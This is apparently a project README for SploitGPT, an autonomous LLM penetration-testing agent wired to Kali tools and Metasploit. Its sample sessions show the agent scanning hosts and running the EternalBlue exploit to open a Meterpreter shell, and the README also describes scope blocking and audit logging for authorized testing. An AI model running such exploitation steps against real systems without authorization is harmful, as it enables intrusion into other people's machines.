# SploitGPT

An autonomous AI penetration testing agent that connects a fine-tuned LLM to a Kali Linux container. The agent has access to the full Kali toolset and can execute commands, run Metasploit modules, and work through an engagement with minimal user input.

## Why This Architecture

The project is structured so that most components are maintained by others:

- **Kali Linux** - The container pulls the official Kali image with 600+ security tools
- **Metasploit** - RPC integration gives the agent full control over exploits and sessions
- **MITRE ATT&CK** - Knowledge base syncs directly from MITRE's official STIX data
- **GTFOBins** - Privilege escalation techniques pulled from the GTFOBins project
- **Ollama** - Local LLM inference, no API keys or cloud dependencies

Every fresh build pulls the latest versions. The only custom component is the fine-tuned model, which is trained on pentesting workflows and tool usage patterns.

## Metasploit Viewer

The MSF Viewer opens a real msfconsole window that mirrors everything the agent does via RPC. You can watch exploits run in real-time, verify what the agent is doing, and learn Metasploit syntax just by observing. Trust but verify.

## Additional Features

- **Scope Enforcement** - Block or warn on out-of-scope targets
- **Audit Logging** - SQLite trail of all commands for compliance
- **Session Resume** - Save and restore engagement state

---

## Quick Start

```bash
# Clone repository
git clone https://github.com/cheeseman2422/SploitGPT.git
cd SploitGPT

# Install (sets up Ollama, pulls model, configures environment)
./install.sh

# Run CLI
./sploitgpt.sh

# Or run TUI (terminal UI)
./sploitgpt.sh --tui
```

**No API keys. No account creation. No telemetry.**

---

## System Requirements

| Component   | Minimum             | Recommended           |
| ----------- | ------------------- | --------------------- |
| **GPU**     | 8GB VRAM (RTX 3060) | 12GB+ VRAM (RTX 4070) |
| **RAM**     | 16GB                | 32GB                  |
| **Storage** | 15GB                | 30GB                  |
| **OS**      | Ubuntu 22.04+ / Kali | Ubuntu 24.04 / Kali   |

**GPU Support:** NVIDIA (CUDA), AMD (ROCm via Ollama), CPU fallback (slow)

---

## Model Installation

SploitGPT requires a fine-tuned model for penetration testing. Download from HuggingFace:

### Option 1: Automatic (Recommended)

```bash
# The install script handles model download
./install.sh
```

### Option 2: Manual Download

Choose based on your VRAM:

| Model | Size | VRAM Required | Quality |
|-------|------|---------------|---------|
| **Q5_K_M** | 5.1GB | 12GB+ | Best quality |
| **Q4_K_M** | 4.4GB | 8GB+ | Good quality, faster |

```bash
# Download from HuggingFace
# Q5 (12GB+ VRAM)
wget https://huggingface.co/cheeseman2422/sploitgpt-7b-v5-gguf/resolve/main/model-Q5_K_M.gguf

# Q4 (8GB+ VRAM)
wget https://huggingface.co/cheeseman2422/sploitgpt-7b-v5-gguf/resolve/main/model-Q4_K_M.gguf

# Create Ollama model
ollama create sploitgpt-7b-v5.10e:q5 -f - <<EOF
FROM ./model-Q5_K_M.gguf
TEMPLATE """{{ if .System }}<|im_start|>system
{{ .System }}<|im_end|>
{{ end }}{{ if .Prompt }}<|im_start|>user
{{ .Prompt }}<|im_end|>
{{ end }}<|im_start|>assistant
"""
PARAMETER stop "<|im_start|>"
PARAMETER stop "<|im_end|>"
PARAMETER temperature 0.3
PARAMETER top_p 0.9
EOF
```

### Verify Installation

```bash
ollama list | grep sploitgpt
# Should show: sploitgpt-7b-v5.10e:q5 or sploitgpt-7b-v5.10e:q4
```

---

## Architecture

```
+---------------------------+       +------------------------------------+
|         Ollama            |       |       Kali Linux Container         |
|                           |       |                                    |
|   +------------------+    |       |  +-------------+  +-------------+  |
|   | SploitGPT Model  |    |  LLM  |  |  SploitGPT  |  | Metasploit  |  |
|   | (Qwen2.5-7B)     |<---------->|  |    Agent    |  | RPC Server  |  |
|   +------------------+    |       |  +------+------+  +------+------+  |
|          GPU              |       |         |                |         |
+---------------------------+       |         v                v         |
                                    |  +-----------------------------+   |
                                    |  |     Kali Tool Arsenal       |   |
                                    |  |  nmap sqlmap hydra nuclei   |   |
                                    |  |  gobuster nikto enum4linux  |   |
                                    |  |       ... 600+ tools        |   |
                                    |  +-----------------------------+   |
                                    +------------------------------------+
```

---

## TUI Features

### Real-Time Activity Panel

The TUI shows live tool execution status with `Ctrl+A`:

```
+--- SploitGPT ----------------------------+--- Activity ---------+
|                                          | [12:34:01] START     |
| User: Scan the target network            |   nmap               |
|                                          | [12:34:15] * 14s     |
| SploitGPT: Running nmap scan...          |   nmap (running)     |
| > nmap -sV -sC 10.0.0.0/24               | [12:34:45] DONE      |
|                                          |   nmap (44s)         |
| [output appears here]                    |                      |
+------------------------------------------+----------------------+
```

- Shows start/complete status for each tool
- Heartbeat indicator for long-running scans
- Toggle with `Ctrl+A`

### Intelligent Tool Selection

```text
User: Enumerate SMB shares on 10.0.0.5

SploitGPT: I'll search for the right tool first.
> tool_search("smb enumeration")
Found: enum4linux, smbclient, smbmap, crackmapexec

Using enum4linux for comprehensive SMB enumeration:
> terminal: enum4linux -a 10.0.0.5
```

### Scope Enforcement

Prevent accidental out-of-scope testing:

```bash
# In .env or environment
SPLOITGPT_SCOPE_TARGETS=10.0.0.0/24,192.168.1.0/24,*.target.local
SPLOITGPT_SCOPE_MODE=block  # or "warn"
```

```text
User: Scan 8.8.8.8

SploitGPT: [SCOPE VIOLATION] Target 8.8.8.8 is outside defined scope.
Scope includes: 10.0.0.0/24, 192.168.1.0/24, *.target.local
Command blocked.
```

### Session Resume

Save and resume pentesting sessions:

```text
User: /save
Session saved: abc123

# Later...
User: /resume abc123
Resumed session abc123
Target: 10.0.0.5 | Phase: exploitation
Previous findings loaded.
```

### Audit Logging

Full audit trail for compliance:

```text
# All tool calls logged to data/audit.db
- Timestamp, session ID, tool name, arguments
- Scope warnings and violations
- Execution results and timing
```

### Direct Metasploit Integration

```text
User: Exploit EternalBlue on 10.0.0.5

SploitGPT: Searching for MS17-010 modules...
> msf_search: "ms17_010"

Using exploit/windows/smb/ms17_010_eternalblue
> msf_run: module=exploit/windows/smb/ms17_010_eternalblue
          options={RHOSTS: 10.0.0.5, LHOST: 10.0.0.1}

[+] Meterpreter session 1 opened (10.0.0.1:4444 -> 10.0.0.5:49158)
```

### MSF Console Viewer

Watch Metasploit commands in real-time in a separate terminal window:

```text
┌─────────────────────────────────────────────────────────────────┐
│ SploitGPT TUI                    │  msfconsole (Viewer)        │
│                                  │                              │
│ User: Run EternalBlue exploit    │  msf6 > use exploit/windows/ │
│                                  │    smb/ms17_010_eternalblue  │
│ SploitGPT: Executing via RPC...  │  msf6 exploit(...) > set     │
│ [+] Session 1 opened             │    RHOSTS 10.0.0.5           │
│                                  │  msf6 exploit(...) > run     │
│                                  │  [+] Meterpreter session 1   │
└─────────────────────────────────────────────────────────────────┘
```

The viewer automatically:
- Opens msfconsole in your desktop's native terminal (gnome-terminal, konsole, etc.)
- Echoes all RPC commands so you can see exactly what's being executed
- Lets you verify actions before they complete

```bash
# Enable/disable in .env
SPLOITGPT_MSF_VIEWER_ENABLED=true  # default: true on desktop systems
```

### Nuclei Vulnerability Scanning

```text
User: Run nuclei scan on https://target.local

SploitGPT: Running nuclei with common vulnerability templates...
> nuclei_scan: target=https://target.local, severity=medium,high,critical

[CVE-2021-44228] Log4Shell - CRITICAL
[CVE-2023-1234] SQL Injection - HIGH
```

---

## Configuration

### Environment Variables

Create `.env` from `.env.example`:

```bash
# LLM
SPLOITGPT_MODEL=sploitgpt-7b-v5.10e:q5
SPLOITGPT_OLLAMA_HOST=http://localhost:11434

# Metasploit RPC
SPLOITGPT_MSF_HOST=127.0.0.1
SPLOITGPT_MSF_PORT=55553
SPLOITGPT_MSF_PASSWORD=msf

# Scope Enforcement (optional)
SPLOITGPT_SCOPE_TARGETS=10.0.0.0/24,*.internal.local
SPLOITGPT_SCOPE_MODE=warn  # warn or block

# Audit Logging
SPLOITGPT_AUDIT_LOG_ENABLED=true
SPLOITGPT_AUDIT_LOG_FILE=data/audit.db

# Optional: Shodan API
SHODAN_API_KEY=your_key_here
```

---

## Project Structure

```
SploitGPT/
├── sploitgpt/           # Main Python package
│   ├── agent/           # AI agent and response handling
│   ├── core/            # Config, boot, audit, scope
│   ├── knowledge/       # RAG, MITRE ATT&CK, GTFOBins
│   ├── msf/             # Metasploit RPC client
│   ├── tools/           # Tool implementations (nuclei, shodan, etc.)
│   ├── training/        # Model training utilities
│   └── tui/             # Terminal UI
├── scripts/             # Setup and utility scripts
├── tests/               # Test suite (280+ tests)
├── docs/                # Documentation
└── data/                # Runtime data (sessions, audit logs)
```

---

## Security & Privacy

### What Stays Local

- LLM inference on your GPU (Ollama)
- All target data and scan results
- Session history and audit logs
- Metasploit RPC (localhost only)

### Optional External Services

1. **Shodan API** - Only if you configure it
2. **NVD/CVE APIs** - For vulnerability lookups
3. **Package updates** - Standard OS updates

**No telemetry. No analytics. No cloud inference.**

---

## CLI Commands

```bash
# Run with CLI interface
./sploitgpt.sh

# Run with TUI (terminal UI)  
./sploitgpt.sh --tui

# Resume a session
./sploitgpt.sh --resume <session_id>
```

### In-Session Commands

| Command | Description |
|---------|-------------|
| `/help` | Show available commands |
| `/save` | Save current session |
| `/resume [id]` | Resume a saved session |
| `/sessions` | List saved sessions |
| `/autonomous` | Toggle autonomous mode |
| `/target <ip>` | Set target |
| `/phase <name>` | Set engagement phase |
| `!<command>` | Execute shell command directly |

---

## Development

### Running Tests

```bash
# Run all tests
python -m pytest tests/ -v

# Run with coverage
python -m pytest tests/ --cov=sploitgpt

# Run specific test file
python -m pytest tests/test_scope.py -v
```

### Code Quality

```bash
# Linting
python -m ruff check sploitgpt/

# Type checking
python -m mypy sploitgpt/ --strict
```

---

## Known Limitations

- **Linux Only** - Designed for Kali/Ubuntu
- **GPU Recommended** - CPU inference is slow
- **English Only** - Model trained on English content
- **Requires Ollama** - For local LLM inference

---

## Ethics & Legal

**This tool executes commands. Use responsibly.**

- Only test systems you own or have written authorization to test
- Comply with all applicable laws regarding security testing
- Use scope enforcement to prevent accidents
- Review audit logs regularly

**Unauthorized access to computer systems is illegal.**

---

## License

- **Code**: MIT License - See [LICENSE](LICENSE)
- **Models**: Subject to base model license (Qwen2.5)
- **Knowledge Sources**: See [docs/ATTRIBUTIONS.md](docs/ATTRIBUTIONS.md)

---

## Acknowledgments

Built with [Ollama](https://ollama.ai/), [Metasploit](https://www.metasploit.com/), [MITRE ATT&CK](https://attack.mitre.org/), and [Unsloth](https://github.com/unslothai/unsloth).

**Made for pentesters who value privacy and local-first software.**
